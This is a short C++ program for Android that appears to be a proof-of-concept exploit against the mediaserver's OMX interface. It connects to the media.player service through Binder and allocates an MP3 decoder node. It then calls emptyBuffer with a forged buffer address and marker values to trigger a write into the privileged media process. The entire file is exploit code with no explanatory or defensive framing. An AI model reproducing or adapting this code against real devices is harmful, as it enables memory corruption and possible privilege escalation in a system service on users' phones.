#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <utils/Log.h>
#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>

namespace android{
#define EXPECT(condition, info) \
    if (!(condition)) {         \
        ALOGE(info); printf("\n  * " info "\n"); return -1; \
    }

#define EXPECT_SUCCESS(err, info) \
    EXPECT((err) == OK, info " failed")
class ExpOmx: public BnOMXObserver {
    public:
        ExpOmx(){};
        int doExp();
        void onMessage(const omx_message &msg);
        
    protected:
        virtual ~ExpOmx(){};
};

int ExpOmx::doExp(){
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> binder = sm->getService(String16("media.player"));
    sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);
    sp<IOMX> omx = service->getOMX();
    /*List<IOMX::ComponentInfo> componentInfos;
    status_t err = omx->listNodes(&componentInfos);
    EXPECT_SUCCESS(err, "listNodes");
    for (List<IOMX::ComponentInfo>::iterator it = componentInfos.begin();
            it != componentInfos.end(); ++it) {
        const IOMX::ComponentInfo &info = *it;
        const char *componentName = info.mName.string();

        if (strncmp(componentName, "OMX.google.", 11)) {
            continue;
        }

        for (List<String8>::const_iterator role_it = info.mRoles.begin();
                role_it != info.mRoles.end(); ++role_it) {
            const char *componentRole = (*role_it).string();
            printf("%s,%s\n",componentName,componentRole);


        }
    }*/
    IOMX::node_id node;
    status_t err = omx->allocateNode("OMX.google.mp3.decoder", this, &node);
    EXPECT_SUCCESS(err, "allocateNode");
    uint32_t writed_address = 0xcccccccc;
    uint32_t writed_content1 = 0xdeadbeef;
    uint32_t writed_content2 = 0xbeafdead;
    err = omx->emptyBuffer(node,writed_address,writed_content1,writed_content2,0,0);
    return 0;
}
void ExpOmx::onMessage(const omx_message &msg){
    printf("msg.type is %d, msg.node is %d",msg.type,msg.node);
}

}
using namespace android;
int main(){
    ProcessState::self()->startThreadPool();
    sp<ExpOmx> expomx= new ExpOmx();
    expomx->doExp();
    IPCThreadState::self()->joinThreadPool();
    return 0;
}
